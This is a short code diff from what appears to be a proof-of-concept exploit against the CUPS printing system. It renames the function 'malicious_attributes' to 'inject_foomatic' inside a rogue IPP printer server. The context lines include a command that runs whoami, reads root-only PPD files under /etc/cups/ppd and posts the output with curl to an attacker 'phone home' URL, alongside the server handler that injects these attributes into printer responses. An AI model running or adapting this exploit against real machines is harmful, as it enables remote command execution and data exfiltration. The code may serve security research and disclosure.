@@ -25,7 +25,7 @@ attacker_http_printer = f"http://{attacker_ip}:{attacker_port}/printers/whatever
 attacker_phone_home = f"http://{attacker_ip}:{attacker_port}/phone/home"
 
 
-def malicious_attributes():
+def inject_foomatic():
 
     # FYI reading /etc/cups/ppd/*.ppd requires root, hence why use this as a demo:
     malicious_cmd = f"(whoami && echo ' ||| ' && wc /etc/cups/ppd/{attacker_printer_name}.ppd && echo ' ||| ' && ls -al /etc/cups/ppd) 2>&1 | curl -X POST {attacker_phone_home} -d @-"
@@ -91,7 +91,7 @@ class AttackerIPPServerHandler(BaseHTTPRequestHandler):
         print(f"request: {ipp_request.to_string()}")
 
         attributes = self.statelessPrinter.printer_list_attributes()
-        attributes.update(malicious_attributes())
+        attributes.update(inject_foomatic())
 
         ipp_response = ippserver.request.IppRequest(
             self.statelessPrinter.version, ippserver.constants.StatusCodeEnum.ok, ipp_request.request_id, attributes)
